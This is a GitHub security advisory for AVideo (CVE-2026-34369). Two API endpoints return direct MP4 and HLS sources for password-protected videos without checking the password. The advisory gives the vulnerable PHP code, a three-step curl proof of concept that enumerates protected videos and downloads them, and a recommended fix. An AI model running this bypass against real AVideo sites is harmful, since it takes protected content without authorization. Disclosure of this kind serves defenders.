# [M] AVideo has Video Password Protection Bypass via API Endpoints Returning Full Playback Sources Without Password Verification

## Summary
Severity: Medium
Advisory: GHSA-q6jj-r49p-94fh
CVE: CVE-2026-34369
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-q6jj-r49p-94fh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `get_api_video_file` and `get_api_video` API endpoints in AVideo return full video playback sources (direct MP4 URLs, HLS manifests) for password-protected videos without verifying the video password. While the normal web playback flow enforces password checks via the `CustomizeUser::getModeYouTube()` hook, this enforcement is completely absent from the API code path. An unauthenticated attacker can retrieve direct playback URLs for any password-protected video by calling the API directly.

## Details

The video password protection is enforced in the web UI via `CustomizeUser::getModeYouTube()` (`plugin/CustomizeUser/CustomizeUser.php:787`), which calls `videoPasswordIsGood()` before rendering the video player. However, this hook is only invoked during web page rendering — the API endpoints bypass it entirely.

**Vulnerable endpoint 1 — `get_api_video_file` (`plugin/API/API.php:986-1004`):**

```php
public function get_api_video_file($parameters)
{
    global $global;
    $obj = $this->startResponseObject($parameters);
    $obj->videos_id = $parameters['videos_id'];
    if (!self::isAPISecretValid()) {
        if (!User::canWatchVideoWithAds($obj->videos_id)) {
            return new ApiObject("You cannot watch this video");
        }
    }
    $video = new Video('', '', $obj->videos_id);
    $obj->filename = $video->getFilename();
    // ...
    $obj->video_file = Video::getHigherVideoPathFromID($obj->videos_id);
    $obj->sources = getSources($obj->filename, true);
    return new ApiObject("", false, $obj);
}
```

The only access check is `User::canWatchVideoWithAds()` (`objects/user.php:1102-1159`), which checks admin status, video active status, owner status, and plugin-level restrictions (subscription/PPV). It does **not** check `video_password`. Password-protected videos have status `'a'` (active), which passes all checks.

**Vulnerable endpoint 2 — `get_api_video` (`plugin/API/API.php:1635-1810`):**

This endpoint returns video metadata including full `videos` paths (line 1759) and `sources` arrays (line 1785) for all videos in query results, with no password verification anywhere in the function.

**The intended password check exists but is never called from these endpoints:**

`Video::verifyVideoPassword()` (`objects/video.php:543-553`) is the proper password verification function, and `get_api_video_password_is_correct` exists as a separate API endpoint — proving password verification was intended as an access control. But neither `get_api_video_file` nor `get_api_video` invoke any password check.

## PoC

```bash
# Step 1: Identify a password-protected video via the video list API
curl -s 'https://target.com/plugin/API/get.json.php?APIName=video&rowCount=50' | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
for v in data.get('response',{}).get('rows',[]):
    if v.get('video_password'):
        print(f'ID: {v[\"id\"]}, Title: {v[\"title\"]}, Password Protected: YES')
        print(f'  Direct sources: {json.dumps(v.get(\"sources\",[])[0] if v.get(\"sources\") else \"none\")}')"

# Step 2: Retrieve full playback sources for the password-protected video
curl -s 'https://target.com/plugin/API/get.json.php?APIName=video_file&videos_id=<PROTECTED_VIDEO_ID>'

# Expected: access denied or password prompt
# Actual: full response with direct MP4/HLS URLs:
# {"error":false,"response":{"videos_id":"123","filename":"video_abc",
#   "video_file":"https://target.com/videos/video_abc/video_abc_HD.mp4",
#   "sources":[{"src":"https://target.com/videos/video_abc/video_abc_HD.mp4","type":"video/mp4"}]}}

# Step 3: Download the protected video directly
curl -O 'https://target.com/videos/video_abc/video_abc_HD.mp4'
```

## Impact

Any unauthenticated user can retrieve direct playable video URLs for all password-protected videos, completely bypassing the password requirement. The `get_api_video` endpoint additionally exposes which videos are password-protected (via the `video_password` field set to `'1'`), allowing targeted enumeration. This renders the `video_password` feature ineffective for any content accessible through the API, which includes mobile apps, third-party integrations, and direct API consumers.

## Recommended Fix

Add password verification to both API endpoints before returning video sources. In `plugin/API/API.php`:

```php
public function get_api_video_file($parameters)
{
    global $global;
    $obj = $this->startResponseObject($parameters);
    $obj->videos_id = $parameters['videos_id'];
    if (!self::isAPISecretValid()) {
        if (!User::canWatchVideoWithAds($obj->videos_id)) {
            return new ApiObject("You cannot watch this video");
        }
        // Check video password protection
        $video = new Video('', '', $obj->videos_id);
        $storedPassword = $video->getVideo_password();
        if (!empty($storedPassword)) {
            $providedPassword = @$parameters['video_password'];
            if (empty($providedPassword) || !Video::verifyVideoPassword($providedPassword, $storedPassword)) {
                return new ApiObject("Video password required", true);
            }
        }
    }
    // ... rest of function
}
```

Apply the same check in `get_api_video()` before populating the `videos` and `sources` fields (around line 1759), replacing source data with an empty object when the password is not provided or incorrect. Also fix `get_api_video_password_is_correct` to use `Video::verifyVideoPassword()` instead of direct `==` comparison (line 1126), which currently fails for bcrypt hashes.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-q6jj-r49p-94fh
- https://nvd.nist.gov/vuln/detail/CVE-2026-34369
- https://github.com/WWBN/AVideo/commit/be344206f2f461c034ad2f1c5d8212dd8a52b8c7
- https://github.com/WWBN/AVideo
